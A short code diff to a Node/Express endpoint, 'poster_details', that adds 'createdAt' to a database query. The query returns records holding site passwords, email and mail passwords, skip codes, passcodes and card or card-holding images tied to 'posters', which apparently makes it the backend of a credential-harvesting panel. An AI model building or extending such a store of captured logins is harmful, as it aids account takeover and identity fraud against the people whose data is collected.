@@ -470,7 +470,7 @@ export const poster_details = async (req, res) => {
 
         const data = await Poster.findOne({ _id: id })
             .select('username password posterId links details')
-            .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard').sort({ createdAt: -1 })
+            .populate('details', 'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt').sort({ createdAt: -1 })
         return res.status(200).json({ data: data })
 
 
